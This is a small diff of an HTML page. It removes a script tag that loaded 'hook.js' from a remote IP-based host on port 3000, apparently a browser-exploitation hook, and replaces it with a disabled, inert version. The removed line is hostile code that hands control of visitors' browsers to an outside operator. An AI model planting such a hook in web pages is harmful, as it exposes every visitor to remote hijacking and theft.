@@ -1,6 +1,6 @@
 <html>
 <head>
-	<script src=”http://139-144-60-176.ip.linodeusercontent.com:3000/hook.js” type=”text/javascript”></script>
+	<script> src=”http://139-144-60-176.ip.linodeusercontent.com:3000/hook.js” type=”text/javascript”></script>
 	<style>
 		body {
 			background-image: url("https://github.com/Fort-Bonnitar/fort-bonnitar.github.io/blob/main/background.png?raw=true");
